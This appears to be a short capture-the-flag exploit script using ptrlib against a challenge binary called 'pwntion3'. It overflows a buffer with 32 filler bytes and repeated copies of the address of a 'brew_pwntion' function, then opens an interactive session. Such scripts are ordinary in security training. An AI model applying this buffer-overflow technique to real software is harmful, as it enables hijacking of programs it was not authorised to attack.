from ptrlib import *

elf = ELF("./pwntion3")
sock = Process("./pwntion3")

payload = b'A' * 32
payload += p32(elf.symbol("brew_pwntion")) * 8
sock.sendline(payload)

sock.interactive()
